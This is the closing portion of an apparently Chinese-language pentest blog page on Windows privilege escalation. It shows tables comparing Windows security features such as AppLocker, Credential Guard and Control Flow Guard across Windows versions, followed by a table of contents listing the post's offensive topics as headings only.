</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview">AppLocker</a></td>
<td>部分的</td>
<td>十</td>
<td>十</td>
<td>十</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.microsoft.com/en-us/windows/comprehensive-security">Windows Defender</a></td>
<td>部分的</td>
<td>部分的</td>
<td>十</td>
<td>十</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard">控制流防护</a></td>
<td></td>
<td></td>
<td>十</td>
<td>十</td>
</tr>
</tbody></table>
<h3 id="Windows-Desktop-Versions"><a href="#Windows-Desktop-Versions" class="headerlink" title="Windows Desktop Versions"></a>Windows Desktop Versions</h3><p>Windows 7 已于 2020 年 1 月 14 日终止使用，但仍在许多环境中使用。</p>
<p>多年来，微软在 Windows 桌面的后续版本中增加了增强的安全功能。下表显示了 Windows 7 和 Windows 10 之间的一些显著差异。</p>
<table>
<thead>
<tr>
<th>特征</th>
<th>Windows 7</th>
<th>Windows 10</th>
</tr>
</thead>
<tbody><tr>
<td><a target="_blank" rel="noopener" href="https://blogs.windows.com/windowsdeveloper/2016/01/26/convenient-two-factor-authentication-with-microsoft-passport-and-windows-hello/">Microsoft 密码 (MFA)</a></td>
<td></td>
<td>十</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/information-protection/bitlocker/bitlocker-overview">BitLocker</a></td>
<td>部分的</td>
<td>十</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard">凭证保护</a></td>
<td></td>
<td>十</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard">远程凭证保护</a></td>
<td></td>
<td>十</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://techcommunity.microsoft.com/t5/iis-support-blog/windows-10-device-guard-and-credential-guard-demystified/ba-p/376419">设备保护（代码完整性）</a></td>
<td></td>
<td>十</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview">AppLocker</a></td>
<td>部分的</td>
<td>十</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.microsoft.com/en-us/windows/comprehensive-security">Windows Defender</a></td>
<td>部分的</td>
<td>十</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard">控制流防护</a></td>
<td></td>
<td>十</td>
</tr>
</tbody></table>

	  <!--
<div class="article-footer-copyright">

    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
</div>
-->
	</div>

	
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2024/12/21/pentest/lateral/Active Directory Enumeration & Attacks/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2024/10/25/pentest/privesc/Linux Privilege Escalation/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2024-11-11 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/Pentest/">Pentest<span>16</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/Privesc/">Privesc<span>3</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Situational-Awareness"><span class="toc-article-text">Situational Awareness</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Network-Information"><span class="toc-article-text">Network Information</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#ifconfig"><span class="toc-article-text">ifconfig</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#arp"><span class="toc-article-text">arp</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#route"><span class="toc-article-text">route</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Enumerating-Protections"><span class="toc-article-text">Enumerating Protections</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Windows-Defender"><span class="toc-article-text">Windows Defender</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#AppLocker"><span class="toc-article-text">AppLocker</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Test-AppLockerPolicy"><span class="toc-article-text">Test-AppLockerPolicy</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Initial-Enumeration"><span class="toc-article-text">Initial Enumeration</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#System-Information"><span class="toc-article-text">System Information</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-article-text">环境变量</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF"><span class="toc-article-text">配置信息</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%A1%A5%E4%B8%81%E5%92%8C%E6%9B%B4%E6%96%B0"><span class="toc-article-text">补丁和更新</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%AE%89%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8"><span class="toc-article-text">安装的应用</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%AD%A3%E5%9C%A8%E8%BF%90%E8%A1%8C%E7%9A%84%E8%BF%9B%E7%A8%8B"><span class="toc-article-text">正在运行的进程</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#User-Group-Information"><span class="toc-article-text">User &amp; Group Information</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7"><span class="toc-article-text">当前用户</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90"><span class="toc-article-text">当前用户权限</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E7%BB%84%E4%BF%A1%E6%81%AF"><span class="toc-article-text">当前用户组信息</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%89%80%E6%9C%89%E7%94%A8%E6%88%B7"><span class="toc-article-text">所有用户</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%89%80%E6%9C%89%E7%BB%84"><span class="toc-article-text">所有组</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%89%B9%E5%AE%9A%E7%BB%84%E8%AF%A6%E6%83%85"><span class="toc-article-text">特定组详情</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5"><span class="toc-article-text">密码策略</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E5%92%8C%E5%85%B6%E4%BB%96%E5%B8%90%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="toc-article-text">密码策略和其他帐户信息</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Process-Communication"><span class="toc-article-text">Process Communication</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Access-Tokens"><span class="toc-article-text">Access Tokens</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Network-Services"><span class="toc-article-text">Network Services</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%B4%BB%E5%8A%A8%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5"><span class="toc-article-text">活动网络连接</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93"><span class="toc-article-text">命名管道</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#LSASS-%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93%E6%9D%83%E9%99%90"><span class="toc-article-text">LSASS 命名管道权限</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%91%BD%E5%90%8D%E7%AE%A1%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90%E7%9A%84%E7%A4%BA%E4%BE%8B"><span class="toc-article-text">命名管提升权限的示例</span></a></li></ol></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Privileges-Overview"><span class="toc-article-text">Privileges Overview</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Windows-Authorization-Process"><span class="toc-article-text">Windows Authorization Process</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Rights-and-Privileges"><span class="toc-article-text">Rights and Privileges</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E5%88%86%E9%85%8D"><span class="toc-article-text">用户权限分配</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%AE%A1%E7%90%86%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90"><span class="toc-article-text">管理用户权限</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%A0%87%E5%87%86%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90"><span class="toc-article-text">标准用户权限</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%A4%87%E4%BB%BD%E6%93%8D%E4%BD%9C%E5%91%98%E6%9D%83%E9%99%90"><span class="toc-article-text">备份操作员权限</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#User-Privileges"><span class="toc-article-text">User Privileges</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#SeImpersonate-SeAssignPrimaryToken"><span class="toc-article-text">SeImpersonate &amp; SeAssignPrimaryToken</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#SeDebugPrivilege"><span class="toc-article-text">SeDebugPrivilege</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#SeTakeOwnershipPrivilege"><span class="toc-article-text">SeTakeOwnershipPrivilege</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Group-Privileges"><span class="toc-article-text">Group Privileges</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Built-in-Groups"><span class="toc-article-text">Built-in Groups</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Backup-Operators"><span class="toc-article-text">Backup Operators</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%A4%8D%E5%88%B6%E6%96%87%E4%BB%B6"><span class="toc-article-text">复制文件</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E8%BD%AC%E5%82%A8-NTDS-dit"><span class="toc-article-text">转储 NTDS.dit</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%A4%87%E4%BB%BD-SAM-%E5%92%8C-SYSTEM-%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%85%8D%E7%BD%AE%E5%8D%95%E5%85%83"><span class="toc-article-text">备份 SAM 和 SYSTEM 注册表配置单元</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%8F%90%E5%8F%96-NTDS-dit-%E5%87%AD%E6%8D%AE"><span class="toc-article-text">提取 NTDS.dit 凭据</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Event-Log-Readers"><span class="toc-article-text">Event Log Readers</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#DnsAdmins"><span class="toc-article-text">DnsAdmins</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#DnsAdmins-%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E5%88%A9%E7%94%A8"><span class="toc-article-text">DnsAdmins 访问权限利用</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Clean"><span class="toc-article-text">Clean</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%88%9B%E5%BB%BA-WPAD-%E8%AE%B0%E5%BD%95"><span class="toc-article-text">创建 WPAD 记录</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Hyper-V-Administrators"><span class="toc-article-text">Hyper-V Administrators</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Print-Operators"><span class="toc-article-text">Print Operators</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%BC%80%E5%90%AF-SeLoadDriverPrivilege"><span class="toc-article-text">开启 SeLoadDriverPrivilege</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%9B%BF%E4%BB%A3%E5%88%A9%E7%94%A8-%E6%97%A0GUI"><span class="toc-article-text">替代利用-无GUI</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#EopLoadDriver-%E8%87%AA%E5%8A%A8%E5%8C%96"><span class="toc-article-text">EopLoadDriver 自动化</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Clean-1"><span class="toc-article-text">Clean</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Server-Operators"><span class="toc-article-text">Server Operators</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#User-Account-Control"><span class="toc-article-text">User Account Control</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Weak-Permissions"><span class="toc-article-text">Weak Permissions</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Permissive-File-System-ACLs"><span class="toc-article-text">Permissive File System ACLs</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#enumeration"><span class="toc-article-text">enumeration</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Replacing-Service-Binary"><span class="toc-article-text">Replacing Service Binary</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Weak-Service-Permissions"><span class="toc-article-text">Weak Service Permissions</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#enumeration-1"><span class="toc-article-text">enumeration</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%9B%B4%E6%94%B9%E6%9C%8D%E5%8A%A1%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84"><span class="toc-article-text">更改服务文件路径</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Clean-2"><span class="toc-article-text">Clean</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Unquoted-Service-Path"><span class="toc-article-text">Unquoted Service Path</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Permissive-Registry-ACLs"><span class="toc-article-text">Permissive Registry ACLs</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Modifiable-Registry-Autorun-Binary"><span class="toc-article-text">Modifiable Registry Autorun Binary</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Kernel-vulnerability"><span class="toc-article-text">Kernel vulnerability</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Vulnerable-Services"><span class="toc-article-text">Vulnerable Services</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#DLL-Injection"><span class="toc-article-text">DLL Injection</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Credential-Hunting"><span class="toc-article-text">Credential Hunting</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Find-File"><span class="toc-article-text">Find File</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-article-text">配置文件</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%AF%8D%E5%85%B8%E6%96%87%E4%BB%B6"><span class="toc-article-text">词典文件</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-article-text">无人值守安装的文件</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#PowerShell"><span class="toc-article-text">PowerShell</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#PowerShell-%E5%8E%86%E5%8F%B2%E6%96%87%E4%BB%B6"><span class="toc-article-text">PowerShell 历史文件</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#PowerShell-%E5%87%AD%E6%8D%AE"><span class="toc-article-text">PowerShell 凭据</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Other-Files"><span class="toc-article-text">Other Files</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Credential-Theft"><span class="toc-article-text">Credential Theft</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Cmdkey-Saved-Credentials"><span class="toc-article-text">Cmdkey Saved Credentials</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Browser-Credentials"><span class="toc-article-text">Browser Credentials</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Password-Managers"><span class="toc-article-text">Password Managers</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Email"><span class="toc-article-text">Email</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Automation-tools"><span class="toc-article-text">Automation tools</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#LaZagne"><span class="toc-article-text">LaZagne</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#SessionGopher"><span class="toc-article-text">SessionGopher</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Clear-Text-Password-Storage-in-the-Registry"><span class="toc-article-text">Clear-Text Password Storage in the Registry</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%9E%9A%E4%B8%BE-Autologon"><span class="toc-article-text">枚举 Autologon</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#PuTTY"><span class="toc-article-text">PuTTY</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Wifi-Passwords"><span class="toc-article-text">Wifi Passwords</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Citrix-Breakout"><span class="toc-article-text">Citrix Breakout</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%BB%95%E8%BF%87%E8%B7%AF%E5%BE%84%E9%99%90%E5%88%B6"><span class="toc-article-text">绕过路径限制</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E4%BB%8E%E5%8F%97%E9%99%90%E7%8E%AF%E5%A2%83%E8%AE%BF%E9%97%AE-SMB-%E5%85%B1%E4%BA%AB"><span class="toc-article-text">从受限环境访问 SMB 共享</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%9B%BF%E4%BB%A3%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8"><span class="toc-article-text">替代资源管理器</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%A4%87%E7%94%A8%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%BC%96%E8%BE%91%E5%99%A8"><span class="toc-article-text">备用注册表编辑器</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E4%BF%AE%E6%94%B9%E7%8E%B0%E6%9C%89%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6"><span class="toc-article-text">修改现有快捷方式文件</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C"><span class="toc-article-text">脚本执行</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90"><span class="toc-article-text">提升权限</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Bypass-UAC"><span class="toc-article-text">Bypass UAC</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Others"><span class="toc-article-text">Others</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Interacting-with-Users"><span class="toc-article-text">Interacting with Users</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%B5%81%E9%87%8F%E6%8D%95%E8%8E%B7"><span class="toc-article-text">流量捕获</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E8%BF%9B%E7%A8%8B%E5%91%BD%E4%BB%A4%E8%A1%8C"><span class="toc-article-text">进程命令行</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB%E4%B8%8A%E7%9A%84-SCF"><span class="toc-article-text">文件共享上的 SCF</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Responder-%E6%8D%95%E8%8E%B7%E5%93%88%E5%B8%8C"><span class="toc-article-text">Responder 捕获哈希</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8%E6%81%B6%E6%84%8F-lnk-%E6%96%87%E4%BB%B6%E6%8D%95%E8%8E%B7%E5%93%88%E5%B8%8C%E5%80%BC"><span class="toc-article-text">使用恶意 .lnk 文件捕获哈希值</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Pillaging"><span class="toc-article-text">Pillaging</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%B7%B2%E5%AE%89%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F"><span class="toc-article-text">已安装的应用程序</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Clipboard"><span class="toc-article-text">Clipboard</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Backup-Servers"><span class="toc-article-text">Backup Servers</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Miscellaneous-Techniques"><span class="toc-article-text">Miscellaneous Techniques</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Living-Off-The-Land-Binaries-and-Scripts-LOLBAS"><span class="toc-article-text">Living Off The Land Binaries and Scripts (LOLBAS)</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Certutil-%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6"><span class="toc-article-text">Certutil 传输文件</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Always-install-with-elevated-privileges"><span class="toc-article-text">Always install with elevated privileges</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-article-text">计划任务</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%94%A8%E6%88%B7-%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%8F%8F%E8%BF%B0%E5%AD%97%E6%AE%B5"><span class="toc-article-text">用户&#x2F;计算机描述字段</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%8C%82%E8%BD%BD-VHDX-VMDK"><span class="toc-article-text">挂载 VHDX&#x2F;VMDK</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Legacy-Operating-Systems"><span class="toc-article-text">Legacy Operating Systems</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#End-of-Life-Systems-EOL"><span class="toc-article-text">End of Life Systems (EOL)</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Windows-Desktop"><span class="toc-article-text">Windows Desktop</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Windows-Server"><span class="toc-article-text">Windows Server</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Differences"><span class="toc-article-text">Differences</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Windows-Server-1"><span class="toc-article-text">Windows Server</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Windows-Desktop-Versions"><span class="toc-article-text">Windows Desktop Versions</span></a></li></ol></li></ol></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2025 n2ryx's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
